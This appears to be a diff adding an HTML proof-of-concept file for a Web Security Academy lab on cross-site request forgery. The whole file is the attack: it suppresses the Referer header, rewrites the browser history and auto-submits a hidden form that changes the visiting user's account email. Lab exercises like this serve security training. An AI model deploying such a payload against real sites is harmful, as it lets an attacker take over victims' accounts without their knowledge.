@@ -1,0 +1,14 @@
+<html>
+  <!-- To bypass the referer header set referrer to None -->
+<meta name="referrer" content="no-referrer">
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://0a69008203844ddc82fb47a000d8001a.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="last&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
